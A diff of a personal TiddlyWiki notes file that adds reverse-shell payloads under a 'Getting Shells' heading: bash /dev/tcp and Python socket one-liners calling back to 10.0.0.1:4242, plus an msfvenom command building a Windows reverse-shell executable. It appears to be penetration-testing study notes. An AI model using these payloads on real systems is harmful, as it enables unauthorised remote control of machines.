@@ -9676,7 +9676,7 @@ OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE." />
 <div created="20210810022253593" modified="20210825230930363" title="$:/state/toc/TableOfContents/Tech-Game Development--118161433">
 <pre>close</pre>
 </div>
-<div created="20211025140115230" list="[[Cyber Security]] [[Privilege Escalation]] CrappyMakerProgrammer" modified="20211025161622575" title="$:/StoryList">
+<div created="20211027101744341" list="[[Cyber Security]] [[Getting Shells]] CrappyMakerProgrammer" modified="20211027101934939" title="$:/StoryList">
 <pre></pre>
 </div>
 <div plugin-type="info" title="$:/temp/info-plugin" type="application/json">
@@ -10836,12 +10836,23 @@ Most popular Game Engines
 
 </pre>
 </div>
-<div created="20210901154708454" modified="20211008083434791" title="Getting Shells">
+<div created="20210901154708454" modified="20211027102158557" title="Getting Shells">
 <pre>! Reverse Shell
 
 !! Payloads 
 
 Some payloads are available [[here|https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md]]
+
+```
+bash -i &gt;&amp; /dev/tcp/10.0.0.1/4242 0&gt;&amp;1
+python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/sh&quot;)'
+```
+
+!!! msfvenom
+
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe &gt; reverse.exe
+```
 
 !! Connecting
 
